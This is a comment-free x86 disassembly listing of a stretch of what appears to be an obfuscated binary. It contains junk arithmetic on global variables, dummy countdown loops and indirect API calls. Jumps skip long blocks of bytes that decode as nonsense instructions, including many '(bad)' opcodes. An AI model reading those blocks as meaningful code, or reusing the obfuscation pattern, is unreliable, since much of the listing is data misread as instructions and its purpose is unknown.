  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	and    dl,BYTE PTR [ecx+0xc]
  410b23:	prefetch BYTE PTR [esi+0x7e]
  410b27:	jle    0x410b1a
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b86
  410b2d:	ds sub ecx,ebx
  410b30:	loope  0x410adb
  410b32:	ds xor ch,ah
  410b35:	scas   eax,DWORD PTR es:[edi]
  410b36:	mov    ebx,0xe67d7b10
  410b3b:	jmp    0x410b05
  410b3d:	pushf  
  410b3e:	inc    ebx
  410b3f:	(bad)
  410b43:	mov    ebx,0x66eb2e6c
  410b48:	xor    bl,BYTE PTR [edi]
  410b4a:	dec    ebx
  410b4b:	pop    esp
  410b4c:	jnp    0x410ba6
  410b4e:	pop    esi
  410b4f:	call   0xed54:0xd7f3233b
  410b56:	push   0x4ed6c30d
  410b5b:	imul   ebp,DWORD PTR [ecx-0x77c51953],0xf079a4fb
  410b65:	or     eax,0xa8845a62
  410b6a:	cmp    eax,0xaef6dcec
  410b6f:	or     al,BYTE PTR [ecx-0x24]
  410b72:	dec    edx
  410b73:	and    DWORD PTR [ebp+eiz*1+0x57],edx
  410b77:	das    
  410b78:	sub    al,0x11
  410b7a:	inc    edi
  410b7b:	add    esp,DWORD PTR [edi+0x3992b831]
  410b81:	push   ebx
  410b82:	push   ss
  410b83:	(bad)  
  410b84:	and    ah,BYTE PTR [eax+eax*2]
  410b87:	in     al,dx
  410b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b89:	mov    ebx,0x5e61e358
  410b8e:	pop    ebx
  410b8f:	xor    DWORD PTR [ecx+0x3a],0x70205ef7
  410b96:	xchg   esi,eax
  410b97:	fsubp  st(1),st
  410b99:	sbb    dl,BYTE PTR [edi-0x61554937]
  410b9f:	and    eax,0x5a877e83
  410ba4:	push   es
  410ba5:	pop    ebp
  410ba6:	cmp    bh,ch
  410ba8:	mov    cl,0x31
  410baa:	add    BYTE PTR [edi*8-0x5baa35b7],0x36
  410bb2:	jecxz  0x410c0e
  410bb4:	jmp    0x410b39
  410bb6:	pusha  
  410bb7:	test   DWORD PTR [eax+0x6b],ebx
  410bba:	and    cl,bl
  410bbc:	push   ebp
  410bbd:	mov    ebp,0x4b6f11c6
  410bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bc3:	add    esi,DWORD PTR [ebx]
  410bc5:	inc    esp
  410bc6:	jno    0x410bf4
  410bc8:	jp     0x410bba
  410bca:	jg     0x410c46
  410bcc:	mov    ch,0xab
  410bce:	mov    ds,ebp
  410bd0:	inc    DWORD PTR [ebx+esi*4-0x687cfb53]
  410bd7:	ficomp WORD PTR [edx-0x7b39a4b7]
  410bdd:	add    eax,0xfa6d3d8e
  410be2:	pop    edx
  410be3:	sbb    BYTE PTR [eax+0x59],al
  410be6:	lods   eax,DWORD PTR ds:[esi]
  410be7:	popf   
  410be8:	fild   WORD PTR [edi+0x1c]
  410beb:	sub    cl,bh
  410bed:	and    bh,bh
  410bef:	and    eax,0xa5fe046d
  410bf4:	pop    ds
  410bf5:	xor    DWORD PTR [esi],esi
  410bf7:	or     eax,0x72ca878a
  410bfc:	arpl   WORD PTR [edi-0x237a5d60],si
  410c02:	bound  edi,QWORD PTR [ebx+ebp*2]
  410c05:	cmp    BYTE PTR [esi+eax*2],0xea
  410c09:	xchg   DWORD PTR [edx+0xfbd6992],ecx
  410c0f:	and    dh,dh
  410c11:	arpl   WORD PTR [ebp+edx*2-0x791d9afc],sp
  410c18:	into   
  410c19:	fs mov bh,0x8b
  410c1c:	jecxz  0x410c72
  410c1e:	pop    eax
  410c1f:	in     eax,dx
  410c20:	add    dh,BYTE PTR [edx]
  410c22:	and    eax,0x7ecd0c29
  410c27:	call   0xadd7:0xc44d9422
  410c2e:	scas   eax,DWORD PTR es:[edi]
  410c2f:	(bad)
  410c32:	out    dx,al
  410c33:	pop    edi
  410c34:	jb     0x410bcc
  410c36:	or     dl,BYTE PTR [ebx+0x30]
  410c39:	in     al,0x48
  410c3b:	push   0x299225d8
  410c40:	fadd   DWORD PTR [ebp-0x4cecc388]
  410c46:	push   0xfffffff2
  410c48:	stos   DWORD PTR es:[edi],eax
  410c49:	jno    0x410c27
  410c4b:	xchg   DWORD PTR [esi+0x69],esp
  410c4e:	test   DWORD PTR ds:0xc040dc31,esi
  410c54:	jecxz  0x410c65
  410c56:	push   esp
  410c57:	fstp   DWORD PTR [eax+0x41ccac62]
  410c5d:	xor    DWORD PTR [ecx-0x6c],ecx
  410c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c61:	loop   0x410c35
  410c63:	leave  
  410c64:	xor    DWORD PTR [esp+edx*1],ecx
  410c67:	sub    DWORD PTR [eax],ebx
  410c69:	das    
  410c6a:	xchg   ecx,eax
  410c6b:	not    DWORD PTR [ecx+ecx*2-0xc7f7a68]
  410c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c73:	xchg   BYTE PTR [ecx-0x31e3d7df],cl
  410c79:	mov    edi,ebp
  410c7b:	mov    ch,0x7c
  410c7d:	(bad)  
  410c7e:	mov    ah,0xd9
  410c80:	add    edx,DWORD PTR [ebp+0x67ed1d98]
  410c86:	jg     0x410c3e
  410c88:	xchg   edx,eax
  410c89:	shl    DWORD PTR [ebx],cl
  410c8b:	int3   
  410c8c:	add    DWORD PTR [esi+0x73e5d5f5],edi
  410c92:	dec    ebx
  410c93:	test   ecx,esp
  410c95:	(bad)  
  410c96:	in     eax,dx
  410c97:	inc    edx
  410c98:	lods   al,BYTE PTR ds:[esi]
  410c99:	out    0xec,eax
  410c9b:	std    
  410c9c:	call   FWORD PTR [eax]
  410c9e:	retf   0x3e19
  410ca1:	(bad)  
  410ca2:	sbb    eax,0x3d61e086
  410ca7:	xchg   al,cl
  410ca9:	and    eax,0xf845c7ec
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    al,BYTE PTR [edi]
  410dcd:	mov    al,0x1
  410dcf:	and    DWORD PTR [edi+eax*2+0x7ff17e7e],ecx
  410dd6:	jle    0x410e56
  410dd8:	in     al,dx
  410dd9:	call   0xb0d2:0x56b91859
  410de0:	and    al,0xaa
  410de2:	ror    BYTE PTR [ebx+0x1864daf7],0x89
  410de9:	cmp    al,0x53
  410deb:	retf   
  410dec:	sub    ebp,esi
  410dee:	mov    ch,0xc4
  410df0:	rcr    BYTE PTR [ecx+0xc],cl
  410df3:	call   0xb06f0d3e
  410df8:	les    ebp,FWORD PTR [ecx-0x3d]
  410dfb:	jae    0x410e5b
  410dfd:	test   esi,0x36c7bc67
  410e03:	pop    edi
  410e04:	shr    DWORD PTR [eax+0x7a],0xae
  410e08:	mov    eax,ds:0xe891593d
  410e0d:	mov    ch,0xa8
  410e0f:	es in  eax,0x2
  410e12:	and    cl,BYTE PTR gs:[ebx-0x71]
  410e16:	sbb    eax,0x6a9a22c7
  410e1b:	mov    ebp,0xb14c1e63
  410e20:	push   ss
  410e21:	(bad)  
  410e23:	dec    eax
  410e24:	lock into 
  410e26:	fcomp  QWORD PTR cs:[ebx+0x73e87909]
  410e2d:	ins    BYTE PTR es:[edi],dx
  410e2e:	push   esi
  410e2f:	jns    0x410e24
  410e31:	(bad)  
  410e32:	(bad)  
  410e33:	hlt    
  410e34:	and    ebx,esp
  410e36:	aas    
  410e37:	adc    al,0x3c
  410e39:	jo     0x410e48
  410e3b:	int    0xc0
  410e3d:	(bad)  
  410e3f:	fldenv [edx-0x36518e9b]
  410e45:	rcr    DWORD PTR [ecx],1
  410e47:	sbb    al,0x12
  410e49:	clc    
  410e4a:	xchg   esi,ecx
  410e4c:	mov    edi,0x423c4816
  410e51:	ret    
  410e52:	imul   edi,DWORD PTR [edi+0x2],0x47cf6fca
  410e59:	fisttp WORD PTR [eax-0x30]
  410e5c:	rcl    DWORD PTR [edi+0x3d],cl
  410e5f:	dec    ebx
  410e60:	into   
  410e61:	jg     0x410df2
  410e63:	jne    0x410df0
  410e65:	or     dh,BYTE PTR [ebx-0x49]
  410e68:	dec    edx
  410e69:	in     eax,dx
  410e6a:	les    esi,FWORD PTR [eax-0x7a78b241]
  410e70:	cmp    bh,BYTE PTR [ebp+0x45]
  410e73:	sub    al,0x29
  410e75:	(bad)  
  410e76:	in     eax,0x47
  410e78:	inc    ecx
  410e79:	cld    
  410e7a:	jno    0x410e63
  410e7c:	sbb    edx,0xffffffc3
  410e7f:	pop    es
  410e80:	adc    DWORD PTR [esi+eax*1+0x10],esi
  410e84:	or     ecx,esi
  410e86:	outs   dx,DWORD PTR ds:[esi]
  410e87:	adc    al,0x58
  410e89:	cwde   
  410e8a:	popf   
  410e8b:	imul   eax,ecx,0xdb850a8f
  410e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e92:	pop    ecx
  410e93:	mov    esp,0x9fc37e66
  410e98:	jmp    0x5b92bc36
  410e9d:	aaa    
  410e9e:	dec    ebx
  410e9f:	push   cs
  410ea0:	inc    ecx
  410ea1:	std    
  410ea2:	mov    eax,DWORD PTR [ecx]
  410ea4:	push   ss
  410ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ea6:	ss dec ebp
  410ea8:	paddw  mm0,mm6
  410eab:	push   ecx
  410eac:	rcl    BYTE PTR [ecx],1
  410eae:	xchg   edx,eax
  410eaf:	inc    esi
  410eb0:	push   0xa2f00fd2
  410eb5:	into   
  410eb6:	(bad)  
  410eb8:	and    eax,0xabac00b
  410ebd:	out    dx,al
  410ebe:	leave  
  410ebf:	add    eax,eax
  410ec1:	push   ecx
  410ec2:	or     al,0xf1
  410ec4:	add    ah,cl
  410ec6:	fstp   st(3)
  410ec8:	test   al,0x1c
  410eca:	push   ebp
  410ecb:	xchg   eax,esi
  410ecd:	push   eax
  410ece:	pop    ebp
  410ecf:	test   ebp,esi
  410ed1:	stc    
  410ed2:	xor    BYTE PTR [ecx+0xd],0x5f
  410ed6:	sbb    eax,0xc9ca77de
  410edb:	in     eax,0x76
  410edd:	xchg   esi,eax
  410ede:	in     eax,dx
  410edf:	in     eax,0xad
  410ee1:	out    dx,eax
  410ee2:	mov    ecx,0xb9c2e279
  410ee7:	inc    ecx
  410ee8:	or     ecx,DWORD PTR [eax]
  410eea:	mov    dh,0x29
  410eec:	rol    BYTE PTR [ecx+0x2203b753],0x92
  410ef3:	cmp    BYTE PTR [edi+0x37],dh
  410ef6:	add    eax,0xa38229c0
  410efb:	push   eax
  410efc:	stos   BYTE PTR es:[edi],al
  410efd:	mov    dl,0x15
  410eff:	hlt    
  410f00:	(bad)  
  410f01:	test   DWORD PTR [ebp-0x69],0xda26776c
  410f08:	add    DWORD PTR [esp+esi*4-0x45],eax
  410f0c:	aas    
  410f0d:	pop    edi
  410f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f0f:	mov    dl,0xfb
  410f11:	jmp    0xd686fab8
  410f16:	push   ss
  410f17:	shr    ebp,0x14
  410f1a:	sub    edx,DWORD PTR [ecx-0x78c4443b]
  410f20:	pop    esi
  410f21:	jle    0x410ef5
  410f23:	popf   
  410f24:	sub    al,0x83
  410f26:	adc    al,0xdb
  410f28:	iret   
  410f29:	jnp    0x410f3e
  410f2b:	fistp  QWORD PTR [ebx]
  410f2d:	xor    eax,0xd6053dd3
  410f32:	ror    BYTE PTR [esi-0x75],cl
  410f35:	aas    
  410f36:	out    dx,al
  410f37:	jp     0x410edf
  410f39:	sub    ch,BYTE PTR [edi+edi*2+0x633af713]
  410f40:	lahf   
  410f41:	pop    edx
  410f42:	inc    eax
  410f43:	test   al,0x51
  410f45:	retf   
  410f46:	or     BYTE PTR [edx+ebp*4],ah
  410f49:	push   0xdaf69612
  410f4e:	lea    edx,[esi+0x70]
  410f51:	and    dh,BYTE PTR [ebp-0x42]
  410f54:	xor    DWORD PTR [esi],ebp
  410f56:	xchg   ebp,eax
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	sub    ebx,ebx
  410ffa:	mov    dl,0x6
  410ffc:	cmovne edi,DWORD PTR [esi+0x7e]
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x41104f
  411005:	adc    DWORD PTR ds:0x6fdce542,edi
  41100b:	push   ds
  41100c:	or     DWORD PTR [ebx-0x550da6d1],esi
  411012:	cwde   
  411013:	int    0xdf
  411015:	sti    
  411016:	xchg   BYTE PTR ds:0x28b47bea,dh
  41101c:	stc    
  41101d:	push   edx
  41101e:	arpl   WORD PTR [ecx],sp
  411020:	(bad)  
  411021:	fistp  QWORD PTR [edi]
  411023:	add    ebp,DWORD PTR [esp+esi*1-0x55524509]
  41102a:	xchg   edi,eax
  41102b:	not    ebx
  41102d:	jmp    0x41102b
  41102f:	push   esp
  411030:	cmp    eax,0x68583a17
  411035:	nop
  411036:	out    0x1f,al
  411038:	xchg   BYTE PTR [edi-0x466987f6],ah
  41103e:	mul    DWORD PTR [edi]
  411040:	cmp    BYTE PTR [eax-0x11ad82e9],bl
  411046:	stos   DWORD PTR es:[edi],eax
  411047:	loopne 0x41109a
  411049:	test   BYTE PTR [edx-0xe],bh
  41104c:	pop    es
  41104d:	mov    esp,DWORD PTR [edi+0x71]
  411050:	popa   
  411051:	aad    0x5b
  411053:	pusha  
  411054:	rol    BYTE PTR [eax+edi*8-0xdd69b7d],0x34
  41105c:	std    
  41105d:	push   cs
  41105e:	in     eax,dx
  41105f:	pop    ds
  411060:	cmp    edi,DWORD PTR [edx-0x2e78b721]
  411066:	ds jecxz 0x4110d1
  411069:	test   al,0xe8
  41106b:	ffree  st(5)
  41106d:	xchg   edx,eax
  41106e:	pop    es
  41106f:	retf   0x9836
  411072:	out    dx,al
  411073:	cmc    
  411074:	dec    esi
  411075:	xchg   BYTE PTR [edx+0x40ee4a99],dh
  41107b:	push   0x439c9bd
  411080:	cdq    
  411081:	xor    DWORD PTR [ecx+0x48ba2ff4],ebx
  411087:	ret    0xfefc
  41108a:	sti    
  41108b:	cmp    edx,DWORD PTR [edi+0x5c]
  41108e:	cli    
  41108f:	and    ebx,DWORD PTR [edx-0x22b5df18]
  411095:	cmp    edx,DWORD PTR ds:0x9a9ab339
  41109b:	jo     0x41103e
  41109d:	shr    DWORD PTR [ebx+0x745b6be4],1
  4110a3:	jecxz  0x411123
  4110a5:	js     0x4110c8
  4110a7:	adc    BYTE PTR [ebx-0x52],ch
  4110aa:	test   al,0x7b
  4110ac:	outs   dx,BYTE PTR ds:[esi]
  4110ad:	sbb    dl,BYTE PTR [edi]
  4110af:	(bad)  
  4110b0:	pop    ecx
  4110b1:	sbb    ch,BYTE PTR [ebx+0x6628a5e6]
  4110b7:	(bad)  
  4110b8:	rcl    ebx,1
  4110ba:	and    al,bh
  4110bc:	call   0xaf70:0xd344ced4
  4110c3:	aas    
  4110c4:	inc    edi
  4110c5:	(bad)  
  4110c6:	jle    0x41107c
  4110c8:	repz loopne 0x4110cc
  4110cb:	cld    
  4110cc:	inc    edx
  4110cd:	scas   al,BYTE PTR es:[edi]
  4110ce:	push   edi
  4110cf:	mov    ecx,fs
  4110d1:	and    ah,ah
  4110d3:	adc    al,0x69
  4110d5:	loope  0x411139
  4110d7:	outs   dx,BYTE PTR ds:[esi]
  4110d8:	test   BYTE PTR [ebx+0x6ff5adce],bl
  4110de:	dec    esi
  4110df:	nop
  4110e0:	cli    
  4110e1:	(bad)  [ebp+0x6b719bd7]
  4110e7:	dec    ebp
  4110e8:	jle    0x41111b
  4110ea:	test   DWORD PTR es:[eax+0x20c8a2cf],edx
  4110f1:	pushf  
  4110f2:	push   esi
  4110f3:	inc    edi
  4110f5:	js     0x4110d6
  4110f7:	sub    DWORD PTR [edi-0x7ed0ae26],esi
  4110fd:	push   edx
  4110fe:	mov    dl,0xde
  411100:	idiv   edx
  411102:	lahf   
  411103:	xchg   esp,eax
  411104:	pop    edi
  411105:	std    
  411106:	lods   al,BYTE PTR ds:[esi]
  411107:	push   eax
  411108:	out    0x42,al
  41110a:	mov    edx,0x3153a5a4
  41110f:	outs   dx,BYTE PTR ds:[esi]
  411110:	mov    dl,0xc4
  411112:	sub    al,0x62
  411114:	shr    edi,cl
  411116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411117:	int3   
  411118:	scas   eax,DWORD PTR es:[edi]
  411119:	sbb    BYTE PTR [ecx+0x46],dl
  41111c:	jne    0x41115d
  41111e:	push   cs
  41111f:	lahf   
  411120:	popf   
  411121:	scas   eax,DWORD PTR es:[edi]
  411122:	cdq    
  411123:	clc    
  411124:	sub    ch,BYTE PTR [ebx-0x5c6c9be6]
  41112a:	not    DWORD PTR [edi]
  41112c:	pop    edx
  41112d:	pop    esp
  41112e:	push   eax
  41112f:	and    DWORD PTR [edi-0x25],esi
  411132:	jns    0x411123
  411134:	jge    0x41112a
  411136:	popf   
  411137:	push   0xb0d72636
  41113c:	push   ds
  41113d:	inc    ecx
  41113e:	adc    DWORD PTR [ebx+0x6c],ecx
  411141:	inc    edx
  411142:	mov    ebp,0x756902b3
  411147:	push   ebx
  411148:	xor    BYTE PTR [edi+0xc],ah
  41114b:	add    al,0x86
  41114d:	sahf   
  41114e:	xchg   BYTE PTR [edi-0x6e445994],ah
  411154:	(bad)  
  411155:	std    
  411156:	clc    
  411157:	and    ecx,ebx
  411159:	(bad)  
  41115a:	or     bh,BYTE PTR [edi]
  41115c:	outs   dx,DWORD PTR ds:[esi]
  41115d:	inc    ecx
  41115e:	arpl   ax,di
  411160:	and    esi,DWORD PTR [ebx+0x40]
  411163:	pop    edx
  411164:	int    0x4e
  411166:	jno    0x411117
  411168:	rdmsr  
  41116a:	xchg   DWORD PTR [eax-0x1c],esp
  41116d:	popf   
  41116e:	cmp    BYTE PTR [si+0x3546],dl
  411173:	inc    edx
  411174:	call   0xa9f52174
  411179:	repz fist DWORD PTR [esi+0x0]
  41117d:	lahf   
  41117e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41117f:	mov    bh,BYTE PTR [ecx+0x32]
  411182:	mov    edx,0x3b02bf
  411187:	add    BYTE PTR [esi+0x3],ah
  41118a:	(bad)  
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xf6dabba7
  4111f1:	jl     0x4111b4
  4111f3:	pop    es
  4111f4:	mov    es,WORD PTR [edx+0x7e]
  4111f7:	jle    0x4111ea
  4111f9:	jg     0x411279
  4111fb:	jle    0x411186
  4111fd:	push   ss
  4111fe:	test   dh,0xed
  411201:	(bad)  
  411202:	xor    dl,BYTE PTR [eax+0x5545793d]
  411208:	data16 in al,dx
  41120a:	out    0x85,eax
  41120c:	inc    ecx
  41120d:	ins    DWORD PTR es:[edi],dx
  41120e:	sbb    eax,0xd5fbb854
  411213:	push   esp
  411214:	call   0x8bf5:0xe4e4e82a
  41121b:	jmp    FWORD PTR [eax+0x75]
  41121e:	add    eax,0xd3d19d27
  411223:	sbb    al,BYTE PTR [edx-0x4a]
  411226:	pop    ebp
  411227:	mov    WORD PTR [esi-0x4],?
  41122a:	mov    WORD PTR [esi+0x4c],ds
  41122d:	and    ch,BYTE PTR [edi+0x57524923]
  411233:	neg    bh
  411235:	pop    edi
  411236:	sbb    al,0xac
  411238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411239:	dec    ebx
  41123a:	cld    
  41123b:	push   ecx
  41123c:	jmp    0x41124b
  41123e:	std    
  41123f:	mov    esi,edi
  411241:	mov    fs,WORD PTR [ebx+0x64]
  411244:	repnz add BYTE PTR [edx-0x4c218c9],bl
  41124b:	jb     0x41128c
  41124d:	mov    cl,0xca
  41124f:	mov    ah,0xaa
  411251:	push   ds
  411252:	jb     0x4111eb
  411254:	xor    DWORD PTR ds:0x1f9f8aaa,eax
  41125a:	fs pop edx
  41125c:	fstp   TBYTE PTR [eax+0x7449025b]
  411262:	sbb    eax,0xa5bd42b2
  411267:	xchg   edi,eax
  411268:	mov    cl,0xcf
  41126a:	pop    ebx
  41126b:	sahf   
  41126c:	int    0x1b
  41126e:	inc    eax
  41126f:	jp     0x411289
  411271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411272:	ss cli 
  411274:	pushf  
  411275:	push   edx
  411276:	cs mov esp,0x4e30233e
  41127c:	dec    esp
  41127d:	mov    DWORD PTR [edx-0x36],esp
  411280:	mov    ch,BYTE PTR ds:0xf943e3ed
  411286:	sbb    BYTE PTR [ebp-0x409f7076],0xdd
  41128d:	xchg   BYTE PTR [edi],bh
  41128f:	jo     0x4112d6
  411291:	repnz test DWORD PTR [edi],esp
  411294:	test   DWORD PTR [edx+0x2d6c5482],0xf39d968c
  41129e:	pop    ebx
  41129f:	popf   
  4112a0:	pop    eax
  4112a1:	lahf   
  4112a2:	ins    DWORD PTR es:[edi],dx
  4112a3:	cdq    
  4112a4:	ins    DWORD PTR es:[edi],dx
  4112a5:	mov    esp,0x61608268
  4112aa:	out    dx,al
  4112ab:	hlt    
  4112ac:	xchg   edi,eax
  4112ad:	xor    DWORD PTR [eax+edi*1],0xfac4a0b0
  4112b4:	mov    ds:0xfa7f5c12,eax
  4112b9:	aad    0x94
  4112bb:	out    dx,al
  4112bc:	aaa    
  4112bd:	jmp    0xc90664b9
  4112c2:	(bad)  
  4112c3:	jg     0x411253
  4112c5:	pop    es
  4112c6:	jb     0x4112d4
  4112c8:	mov    al,ds:0xf4554716
  4112cd:	jecxz  0x41134b
  4112cf:	xchg   esp,eax
  4112d0:	outs   dx,DWORD PTR ds:[esi]
  4112d1:	rcl    DWORD PTR [edi],cl
  4112d3:	pop    edi
  4112d4:	inc    esp
  4112d5:	pop    esi
  4112d6:	div    DWORD PTR [eax-0x48]
  4112d9:	hlt    
  4112da:	mov    ds,WORD PTR [ebx]
  4112dc:	sbb    ecx,0xe353a804
  4112e2:	jp     0x41133e
  4112e4:	mov    ebp,0x58a26516
  4112e9:	sub    ebp,0x40
  4112ec:	mov    ds:0xae7b36bc,eax
  4112f1:	cmp    eax,0x51dd9815
  4112f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112f7:	in     eax,dx
  4112f8:	dec    ebp
  4112f9:	sbb    BYTE PTR [eax+eax*4-0x28],0x5c
  4112fe:	mov    bh,0xb9
  411300:	stc    
  411301:	mov    esi,0x69ab4641
